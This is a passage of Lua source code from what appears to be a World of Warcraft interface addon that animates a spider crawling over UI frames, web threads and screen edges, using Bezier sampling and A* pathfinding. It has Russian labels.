        y = (p0.y + p2.y) / 2,
    }

    local bestT = 0
    local bestD2 = math.huge

    local n = 32

    for i = 0, n do
        local t = i / n

        local px = self:Bz(t, p0.x, p1.x, p2.x)
        local py = self:Bz(t, p0.y, p1.y, p2.y)

        local dx = px - x
        local dy = py - y

        local d2 = dx * dx + dy * dy

        if d2 < bestD2 then
            bestD2 = d2
            bestT = t
        end
    end

    return bestT, math.sqrt(bestD2)
end

function NSPauk:NP_GetThreadOwner(thread)
    local ref = thread and thread.ownerRef
    if not ref then
        return nil
    end
    return ref.conn or ref.seg
end

function NSPauk:NP_ThreadWithinDist(thread, owner, x, y, tol)
    if not thread or not thread.p0 or not thread.p2 then
        return false
    end

    if not owner then
        owner = self:NP_GetThreadOwner(thread)
    end

    if not owner or not owner.textures or #owner.textures == 0 then
        return false
    end

    if type(tol) ~= "number" or tol ~= tol or tol <= 0 then
        return false
    end

    -- ThreadNearMouse делает быструю проверку bounding box.
    if not self:ThreadNearMouse(thread, x, y, tol) then
        return false
    end

    local p0 = thread.p0
    local p2 = thread.p2

    local p1 = thread.p1 or {
        x = (p0.x + p2.x) / 2,
        y = (p0.y + p2.y) / 2,
    }

    local tol2 = tol * tol

    local function close(px, py)
        local dx = (px or 0) - x
        local dy = (py or 0) - y
        return (dx * dx + dy * dy) <= tol2
    end

    if close(p0.x, p0.y) or close(p2.x, p2.y) or close(p1.x, p1.y) then
        return true
    end

    local prevX, prevY
    local n = 8

    for i = 0, n do
        local t = i / n
        local m = 1 - t

        local w0 = m * m
        local w1 = 2 * m * t
        local w2 = t * t

        local px = w0 * p0.x + w1 * p1.x + w2 * p2.x
        local py = w0 * p0.y + w1 * p1.y + w2 * p2.y

        if i == 0 then
            if close(px, py) then
                return true
            end
        else
            if self:PointSegDist2(x, y, prevX, prevY, px, py) <= tol2 then
                return true
            end
        end

        prevX, prevY = px, py
    end

    return false
end

function NSPauk:NP_IsFrameSupportAlive(frame, x, y, tol)
    if not frame then
        return false
    end

    if frame == UIParent then
        local sw, sh = self:GetScreenSize()

        if type(x) == "number" and type(y) == "number" then
            if type(tol) ~= "number" or tol ~= tol or tol < 0 then
                tol = 0
            end

            return x >= -tol
                and x <= sw + tol
                and y >= -tol
                and y <= sh + tol
        end

        return true
    end

    local cur = self:ComputeFrameVisibleInner(frame)
    if not cur then
        return false
    end

    if type(x) == "number" and type(y) == "number" then
        if type(tol) ~= "number" or tol ~= tol or tol < 0 then
            tol = 0
        end

        return x >= cur.left - tol
            and x <= cur.right + tol
            and y >= cur.bottom - tol
            and y <= cur.top + tol
    end

    return true
end

function NSPauk:NP_IsSupportAlive(sup, x, y, tol)
    if not sup or not sup.kind then
        return true
    end

    x = tonumber(x) or 0
    y = tonumber(y) or 0

    local S = self.S
    local gap = self:NP_GetGap()

    if type(tol) ~= "number" or tol ~= tol or tol <= 0 then
        tol = gap
    end

    if sup.kind == "edge" then
        local sw, sh = self:GetScreenSize()

        return x <= gap
            or x >= sw - gap
            or y <= gap
            or y >= sh - gap
    end

    if sup.kind == "frame" then
        local frame = sup.frame

        if sup.family and frame then
            local live = self:NP_FindFamilyFrame(sup.family, frame)
            if live then
                frame = live
            end
        end

        return self:NP_IsFrameSupportAlive(frame, x, y, tol)
    end

    if sup.kind == "web" then
        if not sup.thread then
            return false
        end

        local owner = self:NP_GetThreadOwner(sup.thread)

        if not owner
            or not owner.alive
            or not owner.textures
            or #owner.textures == 0 then
            return false
        end

        return self:NP_ThreadWithinDist(sup.thread, owner, x, y, tol)
    end

    if sup.kind == "hub" then
        local inst

        for _, it in ipairs(S.instances) do
            if it.id == sup.hubInstance then
                inst = it
                break
            end
        end

        if not inst or inst.torn then
            return false
        end

        if inst.hub and inst.hub.frame then
            return self:NP_IsFrameSupportAlive(inst.hub.frame, x, y, tol)
        end

        return true
    end

    return true
end

function NSPauk:NP_ValidateTaskCurrentSupport(task, x, y)
    if not task then
        return false
    end

    if task.nspNoSupportCheck or task.nspFall then
        return true
    end

    local S = self.S

    if type(x) ~= "number" then
        x = S.lastSpiderX or 0
    end
    if type(y) ~= "number" then
        y = S.lastSpiderY or 0
    end

    local gap = self:NP_GetGap()
    local tol = gap * 1.5

    if task.owner and task.owner.alive == false then
        return false
    end

    if task.nspAlongWeb then
        if task.owner then
            return task.owner.alive == true
                and task.owner.textures ~= nil
                and #task.owner.textures > 0
        end
        return true
    end

    local checked = false

    if task.nspSupportA and task.nspSupportA.kind then
        checked = true
        if self:NP_IsSupportAlive(task.nspSupportA, x, y, tol) then
            return true
        end
    end

    if task.nspSupportB and task.nspSupportB.kind then
        checked = true
        if self:NP_IsSupportAlive(task.nspSupportB, x, y, tol) then
            return true
        end
    end

    if not checked then
        if task.owner and task.owner.textures then
            return task.owner.alive == true
                and #task.owner.textures > 0
        end
        return true
    end

    if self:NP_NearSupportWithin(x, y, tol) then
        return true
    end

    return false
end

function NSPauk:NP_EnsureFrameCache()
    local S = self.S
    local now = GetTime()
    local ttl = 1.5

    if S.nspFrameCache and now - (S.nspFrameCache.t or 0) < ttl then
        return S.nspFrameCache.rects
    end

    local items = self:CollectVisibleItems()
    local rects = {}

    for _, item in ipairs(items) do
        if item
            and item.frame
            and item.left
            and item.right
            and item.bottom
            and item.top then

            rects[#rects + 1] = {
                name = item.name,
                family = item.family,
                frame = item.frame,
                left = item.left,
                right = item.right,
                bottom = item.bottom,
                top = item.top,
                width = item.width or (item.right - item.left),
                height = item.height or (item.top - item.bottom),
                cx = item.cx or ((item.left + item.right) / 2),
                cy = item.cy or ((item.bottom + item.top) / 2),
            }
        end
    end

    S.nspFrameCache = {
        t = now,
        rects = rects,
    }

    S.nspSupportCache = nil
    S.nspNearCache = nil
    S.nspFreshSupportCache = nil

    return rects
end

function NSPauk:NP_GetVisibleFrameRects(a, b, padOverride)
    local all = self:NP_EnsureFrameCache()

    if self:NP_RouteNeedsUIParent() then
        local hasUIParent = false

        for _, r in ipairs(all) do
            if r.frame == UIParent then
                hasUIParent = true
                break
            end
        end

        if not hasUIParent then
            local sw, sh = self:GetScreenSize()

            if sw > 0 and sh > 0 then
                local copy = {}

                for _, r in ipairs(all) do
                    copy[#copy + 1] = r
                end

                copy[#copy + 1] = {
                    name = "UIParent",
                    frame = UIParent,
                    left = 0,
                    right = sw,
                    bottom = 0,
                    top = sh,
                    width = sw,
                    height = sh,
                    cx = sw / 2,
                    cy = sh / 2,
                }

                all = copy
            end
        end
    end

    local pad = padOverride or 280

    local minX = math.min(a.x, b.x) - pad
    local maxX = math.max(a.x, b.x) + pad
    local minY = math.min(a.y, b.y) - pad
    local maxY = math.max(a.y, b.y) + pad

    local cx = (minX + maxX) / 2
    local cy = (minY + maxY) / 2

    local cand = {}

    for _, r in ipairs(all) do
        if r.right >= minX
            and r.left <= maxX
            and r.top >= minY
            and r.bottom <= maxY then
            local dx = r.cx - cx
            local dy = r.cy - cy

            cand[#cand + 1] = {
                r = r,
                d = dx * dx + dy * dy,
            }
        end
    end

    table.sort(cand, function(x, y)
        return x.d < y.d
    end)

    local out = {}
    local limit = 50

    for i = 1, #cand do
        if i > limit then
            break
        end

        out[#out + 1] = cand[i].r
    end

    return out
end

function NSPauk:NP_GetWebThreads(a, b, padOverride)
    local S = self.S
    local pad = padOverride or 260
    local minX = math.min(a.x, b.x) - pad
    local maxX = math.max(a.x, b.x) + pad
    local minY = math.min(a.y, b.y) - pad
    local maxY = math.max(a.y, b.y) + pad
    local cx = (minX + maxX) / 2
    local cy = (minY + maxY) / 2

    local cand = {}
    local seen = {}

    local function consider(thread, owner, force)
        if not thread or not thread.p0 or not thread.p2 then
            return
        end
        if not owner or not owner.textures or #owner.textures == 0 then
            return
        end
        if seen[thread] then
            return
        end
        seen[thread] = true

        local minx = math.min(thread.p0.x, thread.p2.x)
        local maxx = math.max(thread.p0.x, thread.p2.x)
        local miny = math.min(thread.p0.y, thread.p2.y)
        local maxy = math.max(thread.p0.y, thread.p2.y)
        if thread.p1 then
            if thread.p1.x < minx then minx = thread.p1.x end
            if thread.p1.x > maxx then maxx = thread.p1.x end
            if thread.p1.y < miny then miny = thread.p1.y end
            if thread.p1.y > maxy then maxy = thread.p1.y end
        end

        if not force and (maxx < minX or minx > maxX or maxy < minY or miny > maxY) then
            return
        end

        local mx = (minx + maxx) / 2
        local my = (miny + maxy) / 2
        local dx = mx - cx
        local dy = my - cy
        cand[#cand + 1] = {
            thread = thread,
            d = dx * dx + dy * dy,
            force = force == true,
        }
    end

    local current = S.currentInstance
    if current and not current.torn and current.conns then
        for _, conn in ipairs(current.conns) do
            if conn.alive and conn.thread then
                consider(conn.thread, conn, true)
            end
        end
    end

    for _, inst in ipairs(S.instances) do
        if inst.conns then
            for _, conn in ipairs(inst.conns) do
                if conn.alive and conn.thread then
                    consider(conn.thread, conn, false)
                end
            end
        end
        if inst.crossSegs then
            for _, seg in ipairs(inst.crossSegs) do
                if seg.alive and seg.thread then
                    consider(seg.thread, seg, false)
                end
            end
        end
    end

    table.sort(cand, function(x, y)
        return x.d < y.d
    end)

    local out = {}

    local limit = 800
    for i = 1, #cand do
        local entry = cand[i]
        if entry.force or i <= limit then
            local samples = self:NP_EnsureThreadSamples(entry.thread)
            if samples and #samples > 0 then
                out[#out + 1] = {
                    thread = entry.thread,
                    samples = samples,
                }
            end
        end
    end

    return out
end

function NSPauk:NP_FindSupportAt(x, y)
    local S = self.S
    local gap = self:NP_GetGap()
    local sw, sh = self:GetScreenSize()

    local rects = self:NP_EnsureFrameCache()

    for _, r in ipairs(rects) do
        if x >= r.left - 1
            and x <= r.right + 1
            and y >= r.bottom - 1
            and y <= r.top + 1 then

            return {
                kind = "frame",
                name = r.name,
                family = r.family,
                x = x,
                y = y,
                rect = r,
            }
        end
    end

    local checked = 0

    local function checkThread(thread, owner)
        if not thread or not thread.p0 or not thread.p2 then
            return false
        end

        if not owner or not owner.textures or #owner.textures == 0 then
            return false
        end

        if self:ThreadNearMouse(thread, x, y, gap) then
            local d = self:DistToThread(thread, x, y)

            if d <= gap * 0.75 then
                return true
            end
        end

        return false
    end

    for _, inst in ipairs(S.instances) do
        if inst.conns then
            for _, conn in ipairs(inst.conns) do
                if conn.alive and conn.thread then
                    checked = checked + 1

                    if checkThread(conn.thread, conn) then
                        return {
                            kind = "web",
                            name = "паутина",
                            x = x,
                            y = y,
                        }
                    end
                end
            end
        end

        if inst.crossSegs then
            for _, seg in ipairs(inst.crossSegs) do
                if seg.alive and seg.thread then
                    checked = checked + 1

                    if checkThread(seg.thread, seg) then
                        return {
                            kind = "web",
                            name = "паутина",
                            x = x,
                            y = y,
                        }
                    end
                end
            end
        end

        if checked >= 80 then
            break
        end
    end

    if x <= gap then
        return {
            kind = "edge",
            name = "край экрана",
            side = "left",
            x = 0,
            y = y,
        }
    elseif x >= sw - gap then
        return {
            kind = "edge",
            name = "край экрана",
            side = "right",
            x = sw,
            y = y,
        }
    elseif y <= gap then
        return {
            kind = "edge",
            name = "край экрана",
            side = "bottom",
            x = x,
            y = 0,
        }
    elseif y >= sh - gap then
        return {
            kind = "edge",
            name = "край экрана",
            side = "top",
            x = x,
            y = sh,
        }
    end

    return nil
end

function NSPauk:NP_FindFallTarget(x, y)
    local S = self.S
    local gap = self:NP_GetGap()
    local bestY = -math.huge
    local best = {
        x = x,
        y = 0,
        kind = "edge",
        name = "низ экрана",
    }
    local rects = self:NP_EnsureFrameCache()
    for _, r in ipairs(rects) do
        if x >= r.left - 2 and x <= r.right + 2 then
            local top = r.top
            if top <= y + 1 and top > bestY then
                bestY = top
                best = {
                    x = x,
                    y = top,
                    kind = "frame",
                    name = r.name,
                    rect = r,
                }
            end
        end
    end
    local checked = 0
    local xTol = math.max(4, gap * 0.6)
    for _, inst in ipairs(S.instances) do
        if inst.conns then
            for _, conn in ipairs(inst.conns) do
                if conn.alive
                    and conn.thread
                    and conn.textures
                    and #conn.textures > 0 then
                    checked = checked + 1
                    local samples = self:NP_EnsureThreadSamples(conn.thread)
                    if samples then

                        for si = 1, #samples, 4 do
                            local p = samples[si]
                            if math.abs(p.x - x) <= xTol
                                and p.y <= y + 1
                                and p.y > bestY then
                                bestY = p.y
                                best = {
                                    x = x,
                                    y = p.y,
                                    kind = "web",
                                    name = "паутина",
                                }
                            end
                        end
                    end
                end
            end
        end
        if inst.crossSegs then
            for _, seg in ipairs(inst.crossSegs) do
                if seg.alive
                    and seg.thread
                    and seg.textures
                    and #seg.textures > 0 then
                    checked = checked + 1
                    local samples = self:NP_EnsureThreadSamples(seg.thread)
                    if samples then
                        for si = 1, #samples, 4 do
                            local p = samples[si]
                            if math.abs(p.x - x) <= xTol
                                and p.y <= y + 1
                                and p.y > bestY then
                                bestY = p.y
                                best = {
                                    x = x,
                                    y = p.y,
                                    kind = "web",
                                    name = "паутина",
                                }
                            end
                        end
                    end
                end
            end
        end
        if checked >= 80 then
            break
        end
    end
    if best.y < 0 then
        best.y = 0
    end
    return best
end

function NSPauk:NP_SupportDescription(sup)
    if not sup then
        return "нет"
    end

    if sup.kind == "frame" then
        return string.format(
            "фрейм %s (%.0f,%.0f)",
            tostring(sup.name or "?"),
            sup.x or 0,
            sup.y or 0
        )
    elseif sup.kind == "web" then
        return string.format(
            "паутина (%.0f,%.0f)",
            sup.x or 0,
            sup.y or 0
        )
    elseif sup.kind == "edge" then
        return string.format(
            "край экрана %s (%.0f,%.0f)",
            tostring(sup.side or "?"),
            sup.x or 0,
            sup.y or 0
        )
    end

    return string.format(
        "объект (%.0f,%.0f)",
        sup.x or 0,
        sup.y or 0
    )
end

function NSPauk:NP_NewHeap()
    return { items = {} }
end

function NSPauk:NP_HeapPush(heap, node, priority)
    local h = heap.items
    h[#h + 1] = { node = node, priority = priority }
    local i = #h
    while i > 1 do
        local parent = math.floor(i / 2)
        if h[parent].priority <= h[i].priority then
            break
        end
        h[parent], h[i] = h[i], h[parent]
        i = parent
    end
end

function NSPauk:NP_HeapPop(heap)
    local h = heap.items
    local n = #h
    if n == 0 then
        return nil, nil
    end

    local topNode = h[1].node
    local topPriority = h[1].priority

    h[1] = h[n]
    h[n] = nil
    n = n - 1

    local i = 1
    while true do
        local left = 2 * i
        local right = 2 * i + 1
        local smallest = i

        if left <= n and h[left].priority < h[smallest].priority then
            smallest = left
        end
        if right <= n and h[right].priority < h[smallest].priority then
            smallest = right
        end

        if smallest == i then
            break
        end

        h[i], h[smallest] = h[smallest], h[i]
        i = smallest
    end

    return topNode, topPriority
end

function NSPauk:NP_AStar(start, goal, nodes, edges, heuristicScale)
    local gScore = {}
    local prev = {}

    if not start or not goal then
        return gScore, prev
    end

    if start == goal then
        gScore[start] = 0
        return gScore, prev
    end

    local fScore = {}
    local closed = {}

    local goalNode = nodes[goal]
    local goalX = goalNode and goalNode.x or 0
    local goalY = goalNode and goalNode.y or 0

    if type(heuristicScale) ~= "number"
        or heuristicScale ~= heuristicScale
        or heuristicScale < 0 then
        heuristicScale = 0
    end

    local function heuristic(i)
        local n = nodes[i]
        if not n then
            return 0
        end
        local dx = (n.x or 0) - goalX
        local dy = (n.y or 0) - goalY
        return math.sqrt(dx * dx + dy * dy) * heuristicScale
    end

    local heap = self:NP_NewHeap()
    gScore[start] = 0
    fScore[start] = heuristic(start)
    self:NP_HeapPush(heap, start, fScore[start])

    while true do
        local current, currentF = self:NP_HeapPop(heap)
        if not current then
            break
        end

        if not closed[current] then
            local stale = currentF
                and fScore[current]
                and currentF > fScore[current] + 1e-9

            if not stale then
                closed[current] = true

                if current == goal then
                    break
                end

                local neighbors = edges[current]
                if neighbors then
                    for _, e in ipairs(neighbors) do
                        local v = e.to
                        if v and not closed[v] then
                            local tentative = gScore[current] + e.w
                            if not gScore[v] or tentative < gScore[v] then
                                gScore[v] = tentative
                                prev[v] = current
                                fScore[v] = tentative + heuristic(v)
                                self:NP_HeapPush(heap, v, fScore[v])
                            end
                        end
                    end
                end
            end
        end
    end

    return gScore, prev
end

function NSPauk:NP_ReconstructPath(prev, start, goal, nodes)
    local rev = {}
    local cur = goal
    local reached = false
    local guard = 0

    while cur do
        guard = guard + 1
        if guard > 10000 then
            break
        end

        rev[#rev + 1] = cur

        if cur == start then
            reached = true
            break
        end

        cur = prev[cur]
    end

    if not reached then
        return nil
    end

    local pts = {}

    for i = #rev, 1, -1 do
        local node = nodes[rev[i]]
        if node then
            pts[#pts + 1] = {
                x = node.x or 0,
                y = node.y or 0,
                kind = node.kind,
                frame = node.frame,
                thread = node.thread,
                edgeSide = node.edgeSide,
                hubInstance = node.hubInstance,
                name = node.name,
            }
        end
    end

    return pts
end

function NSPauk:NP_BuildRoute(from, to)
    local S = self.S
    local sw, sh = self:GetScreenSize()
    S.SW, S.SH = sw, sh
    local gap = self:NP_GetGap()
    local frames = self:NP_GetVisibleFrameRects(from, to, 280)
    local threads = self:NP_GetWebThreads(from, to, 260)
    local nodes = {}
    local edges = {}
    local function addNode(n)
        table.insert(nodes, n)
        edges[#nodes] = {}
        return #nodes
    end
    local EDGE_PENALTY = 2.00
    local WEB_BONUS    = 0.30
    local FRAME_BONUS  = 0.70
    local GAP_PENALTY  = 1.00
    local HUB_BONUS    = 2.50
    local function addEdge(a, b, w, kind)
        if a and b and a ~= b then
            if not w or w < 0 then
                w = 0
            end
            if kind == "edge" then
                w = w * EDGE_PENALTY
            elseif kind == "web" then
                w = w * WEB_BONUS
            elseif kind == "frame" then
                w = w * FRAME_BONUS
            elseif kind == "gap" then
                w = w * GAP_PENALTY
            elseif kind == "hub" then
                w = w * HUB_BONUS
            end
            table.insert(edges[a], { to = b, w = w })
            table.insert(edges[b], { to = a, w = w })
        end
    end
    local function addEdgeNode(x, y, side)
        addNode({
            x = x,
            y = y,
            kind = "edge",
            edgeSide = side,
        })
    end
    addEdgeNode(0, 0, "bottom")
    addEdgeNode(sw * 0.5, 0, "bottom")
    addEdgeNode(sw, 0, "bottom")
    addEdgeNode(sw, 0, "right")
    addEdgeNode(sw, sh * 0.5, "right")
    addEdgeNode(sw, sh, "right")
    addEdgeNode(sw, sh, "top")
    addEdgeNode(sw * 0.5, sh, "top")
    addEdgeNode(0, sh, "top")
    addEdgeNode(0, sh, "left")
    addEdgeNode(0, sh * 0.5, "left")
    addEdgeNode(0, 0, "left")
    local function addEdgeProjection(id)
        local n = nodes[id]
        if not n or n.kind == "edge" then
            return
        end
        if n.x <= gap then
            local eid = addNode({
                x = 0,
                y = n.y,
                kind = "edge",
                edgeSide = "left",
            })
            addEdge(id, eid, math.abs(n.x), "edge")
        end
        if n.x >= sw - gap then
            local eid = addNode({
                x = sw,
                y = n.y,
                kind = "edge",
                edgeSide = "right",
            })
            addEdge(id, eid, math.abs(sw - n.x), "edge")
        end
        if n.y <= gap then
            local eid = addNode({
                x = n.x,
                y = 0,
                kind = "edge",
                edgeSide = "bottom",
            })
            addEdge(id, eid, math.abs(n.y), "edge")
        end
        if n.y >= sh - gap then
            local eid = addNode({
                x = n.x,
                y = sh,
                kind = "edge",
                edgeSide = "top",
            })
            addEdge(id, eid, math.abs(sh - n.y), "edge")
        end
    end
    for fi, rect in ipairs(frames) do
        local cx = (rect.left + rect.right) / 2
        local cy = (rect.bottom + rect.top) / 2
        local pts = {
            { x = rect.left, y = rect.bottom },
            { x = cx, y = rect.bottom },
            { x = rect.right, y = rect.bottom },
            { x = rect.right, y = cy },
            { x = rect.right, y = rect.top },
            { x = cx, y = rect.top },
            { x = rect.left, y = rect.top },
            { x = rect.left, y = cy },
        }
        local ids = {}
        for _, p in ipairs(pts) do
            local id = addNode({
                x = p.x,
                y = p.y,
                kind = "frame",
                frameId = fi,
                name = rect.name,
                frame = rect.frame,
            })
            ids[#ids + 1] = id
        end
        frames[fi].nodeIds = ids
        for a = 1, #ids do
            for b = a + 1, #ids do
                local na = nodes[ids[a]]
                local nb = nodes[ids[b]]
                local dx = na.x - nb.x
                local dy = na.y - nb.y
                addEdge(ids[a], ids[b], math.sqrt(dx * dx + dy * dy), "frame")
            end
            addEdgeProjection(ids[a])
        end
    end
    local threadNodeIdByThread = {}
    local threadSamplesByThread = {}
    for wi, info in ipairs(threads) do
        local ids = {}
        local prevId = nil
        for _, p in ipairs(info.samples) do
            local id = addNode({
                x = p.x,
                y = p.y,
                kind = "web",
                webId = wi,
                thread = info.thread,
            })
            ids[#ids + 1] = id
            if prevId then
                local pp = nodes[prevId]
                local dx = pp.x - p.x
                local dy = pp.y - p.y
                addEdge(prevId, id, math.sqrt(dx * dx + dy * dy), "web")
            end
            addEdgeProjection(id)
            prevId = id
        end
        threads[wi].nodeIds = ids
        if info.thread then
            threadNodeIdByThread[info.thread] = ids
            threadSamplesByThread[info.thread] = info.samples
        end
    end
    local function nearestNodeIdTo(ids, samples, x, y)
        if not ids or not samples then
            return nil
        end
        local bestId = nil
        local bestD2 = math.huge
        for i, p in ipairs(samples) do
            local id = ids[i]
            if id then
                local dx = p.x - x
                local dy = p.y - y
                local d2 = dx * dx + dy * dy
                if d2 < bestD2 then
                    bestD2 = d2
                    bestId = id
                end
            end
        end
        return bestId, bestD2
    end
    for _, inst in ipairs(S.instances) do
        if not inst.torn
            and inst.hub
            and inst.hub.frame
            and inst.hub.rect
            and inst.conns
            and #inst.conns > 0 then
            local hubX = inst.hub.rect.cx
            local hubY = inst.hub.rect.cy
            if type(hubX) == "number" and type(hubY) == "number" then
                local hubId = addNode({
                    x = hubX,
                    y = hubY,
                    kind = "hub",
                    hubInstance = inst.id,
                })
                for _, conn in ipairs(inst.conns) do
                    if conn.alive
                        and conn.thread
                        and conn.thread.p0
                        and conn.textures
                        and #conn.textures > 0 then
                        local ids = threadNodeIdByThread[conn.thread]
                        local samples = threadSamplesByThread[conn.thread]
                        if ids and samples then
                            local nodeId = nearestNodeIdTo(
                                ids,
                                samples,
                                conn.thread.p0.x,
                                conn.thread.p0.y
                            )
                            if nodeId then
                                local n = nodes[nodeId]
                                local dx = hubX - n.x
                                local dy = hubY - n.y
                                local d = math.sqrt(dx * dx + dy * dy)
                                if d < 1 then
                                    d = 1
                                end
                                addEdge(hubId, nodeId, d, "hub")
                            end
                        end
                    end
                end
            end
        end
    end

    local cellSize = gap
    if cellSize < 1 then
        cellSize = 1
    end
    local grid = {}
    for i = 1, #nodes do
        local ni = nodes[i]
        if ni.kind == "frame" or ni.kind == "web" or ni.kind == "hub" then
            local cx = math.floor(ni.x / cellSize)
            local cy = math.floor(ni.y / cellSize)
            local key = (cx + 5000) * 10000 + (cy + 5000)
            if not grid[key] then
                grid[key] = {}
            end
            grid[key][#grid[key] + 1] = i
        end
    end

    for i = 1, #nodes do
        local ni = nodes[i]
        if ni.kind == "frame" or ni.kind == "web" or ni.kind == "hub" then
            local cx = math.floor(ni.x / cellSize)
            local cy = math.floor(ni.y / cellSize)
            for dx = -1, 1 do
                for dy = -1, 1 do
                    local key = (cx + dx + 5000) * 10000 + (cy + dy + 5000)
                    local cell = grid[key]
                    if cell then
                        for _, j in ipairs(cell) do
                            if j > i then
                                local nj = nodes[j]
                                local same = false
                                if ni.kind == "frame"
                                    and nj.kind == "frame"
                                    and ni.frameId == nj.frameId then
                                    same = true
                                end
                                if ni.kind == "web"
                                    and nj.kind == "web"
                                    and ni.webId == nj.webId then
                                    same = true
                                end
                                if ni.kind == "hub"
                                    and nj.kind == "hub"
                                    and ni.hubInstance == nj.hubInstance then
                                    same = true
                                end
                                if not same then
                                    local ddx = ni.x - nj.x
                                    local ddy = ni.y - nj.y
                                    local d2 = ddx * ddx + ddy * ddy
                                    if d2 <= gap * gap then
                                        addEdge(i, j, math.sqrt(d2), "gap")
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    local sides = {
        bottom = {},
        top = {},
        left = {},
        right = {},
    }
    for i, n in ipairs(nodes) do
        if n.kind == "edge" and n.edgeSide and sides[n.edgeSide] then
            table.insert(sides[n.edgeSide], i)
        end
    end
    local function connectSide(list, useX)
        table.sort(list, function(a, b)
            if useX then
                if nodes[a].x == nodes[b].x then
                    return nodes[a].y < nodes[b].y
                end
                return nodes[a].x < nodes[b].x
            else
                if nodes[a].y == nodes[b].y then
                    return nodes[a].x < nodes[b].x
                end
                return nodes[a].y < nodes[b].y
            end
        end)
        for k = 1, #list - 1 do
            local a = list[k]
            local b = list[k + 1]
            local dx = nodes[a].x - nodes[b].x
            local dy = nodes[a].y - nodes[b].y
            addEdge(a, b, math.sqrt(dx * dx + dy * dy), "edge")
        end
    end
    connectSide(sides.bottom, true)
    connectSide(sides.top, true)
    connectSide(sides.left, false)
    connectSide(sides.right, false)
    for i = 1, #nodes do
        if nodes[i].kind == "edge" then
            for j = i + 1, #nodes do
                if nodes[j].kind == "edge" then
                    local dx = nodes[i].x - nodes[j].x
                    local dy = nodes[i].y - nodes[j].y
                    local d2 = dx * dx + dy * dy
                    if d2 <= gap * gap then
                        addEdge(i, j, math.sqrt(d2), "edge")
                    end
                end
            end
        end
    end
    local startIdx = addNode({
        x = from.x,
        y = from.y,
        kind = "start",
    })
    local targetIdx = addNode({
        x = to.x,
        y = to.y,
        kind = "target",
    })
    local topX = to.x
    if topX < 0 then
        topX = 0
    elseif topX > sw then
        topX = sw
    end
    local topIdx = addNode({
        x = topX,
        y = sh,
        kind = "edge",
        edgeSide = "top",
    })
    for i, n in ipairs(nodes) do
        if i ~= topIdx and n.kind == "edge" and n.edgeSide == "top" then
            addEdge(topIdx, i, math.abs(n.x - topX), "edge")
        end
    end
    local function connectPoint(idx, point)
        for fi, rect in ipairs(frames) do
            local inside = point.x >= rect.left - 1
                and point.x <= rect.right + 1
                and point.y >= rect.bottom - 1
                and point.y <= rect.top + 1
            if inside and rect.nodeIds then
                for _, nid in ipairs(rect.nodeIds) do
                    local n = nodes[nid]
                    local dx = point.x - n.x
                    local dy = point.y - n.y
                    local d = math.sqrt(dx * dx + dy * dy)
                    if d < 1 then
                        d = 1
                    end
                    addEdge(idx, nid, d, "frame")
                end
            elseif rect.nodeIds then
                for _, nid in ipairs(rect.nodeIds) do
                    local n = nodes[nid]
                    local dx = point.x - n.x
                    local dy = point.y - n.y
                    local d2 = dx * dx + dy * dy
                    if d2 <= gap * gap then
                        addEdge(idx, nid, math.sqrt(d2), "gap")
                    end
                end
            end
        end
        local hubPickGap = gap * 2.5
        for i, n in ipairs(nodes) do
            if n.kind == "hub" then
                local dx = point.x - n.x
                local dy = point.y - n.y
                local d2 = dx * dx + dy * dy
                if d2 <= hubPickGap * hubPickGap then
                    local d = math.sqrt(d2)
                    if d < 1 then
                        d = 1
                    end
                    addEdge(idx, i, d, "hub")
                end
            end
        end
        local webPickGap = gap * 1.5
        for _, info in ipairs(threads) do
            if info.nodeIds
                and info.thread
                and info.samples
                and #info.samples > 0 then
                local attached = false
                local _, curveDist = self:NP_NearestThreadT(info.thread, point.x, point.y)
                if curveDist <= webPickGap then
                    local bestSampleIdx = nil
                    local bestD2 = math.huge
                    for si, sp in ipairs(info.samples) do
                        local dx = point.x - sp.x
                        local dy = point.y - sp.y
                        local d2 = dx * dx + dy * dy
                        if d2 < bestD2 then
                            bestD2 = d2
                            bestSampleIdx = si
                        end
                    end
                    if bestSampleIdx then
                        for offset = -1, 1 do
                            local nid = info.nodeIds[bestSampleIdx + offset]
                            if nid then
                                local n = nodes[nid]
                                local dx = point.x - n.x
                                local dy = point.y - n.y
                                local d = math.sqrt(dx * dx + dy * dy)
                                if d < 1 then
                                    d = 1
                                end
                                addEdge(idx, nid, d, "web")
                                attached = true
                            end
                        end
                    end
                end
                if not attached then
                    for _, nid in ipairs(info.nodeIds) do
                        local n = nodes[nid]
                        local dx = point.x - n.x
                        local dy = point.y - n.y
                        local d2 = dx * dx + dy * dy
                        if d2 <= webPickGap * webPickGap then
                            addEdge(idx, nid, math.sqrt(d2), "web")
                        end
                    end
                end
            end
        end
        local function connectEdgeProj(side, px, py, weight)
            local eid = addNode({
                x = px,
                y = py,
                kind = "edge",
                edgeSide = side,
            })
            addEdge(idx, eid, weight, "edge")
            for i, n in ipairs(nodes) do
                if i ~= eid and n.kind == "edge" and n.edgeSide == side then
                    local d
                    if side == "bottom" or side == "top" then
                        d = math.abs(px - n.x)
                    else
                        d = math.abs(py - n.y)
                    end
                    addEdge(eid, i, d, "edge")
                end
            end
        end
        if point.x <= gap then
            connectEdgeProj("left", 0, point.y, point.x)
        end
        if point.x >= sw - gap then
            connectEdgeProj("right", sw, point.y, sw - point.x)
        end
        if point.y <= gap then
            connectEdgeProj("bottom", point.x, 0, point.y)
        end
        if point.y >= sh - gap then
            connectEdgeProj("top", point.x, sh, sh - point.y)
        end
    end



    connectPoint(startIdx, from)
    connectPoint(targetIdx, to)

    local heuristicScale = math.min(
        EDGE_PENALTY,
        WEB_BONUS,
        FRAME_BONUS,
        GAP_PENALTY,
        HUB_BONUS
    )
    local directDist, directPrev = self:NP_AStar(
        startIdx,
        targetIdx,
        nodes,
        edges,
        heuristicScale
    )
    local directPath = nil
    local directLen = nil
    if directDist
        and directDist[targetIdx]
        and directDist[targetIdx] < math.huge then
        directLen = directDist[targetIdx]
        directPath = self:NP_ReconstructPath(directPrev, startIdx, targetIdx, nodes)
    end
    local topDist, topPrev = self:NP_AStar(
        startIdx,
        topIdx,
        nodes,
        edges,
        heuristicScale
    )
    local topPath = nil
    local topLen = nil
    if topDist
        and topDist[topIdx]
        and topDist[topIdx] < math.huge then
        topLen = topDist[topIdx]
        topPath = self:NP_ReconstructPath(topPrev, startIdx, topIdx, nodes)
    end




    local fallbackLength = nil
    if topLen and topPath then
        fallbackLength = topLen + math.abs(sh - to.y)
    end
    local function actualLen(pts)
        local total = 0
        for i = 1, #pts - 1 do
            local dx = pts[i].x - pts[i + 1].x
            local dy = pts[i].y - pts[i + 1].y
            total = total + math.sqrt(dx * dx + dy * dy)
        end
        return total
    end
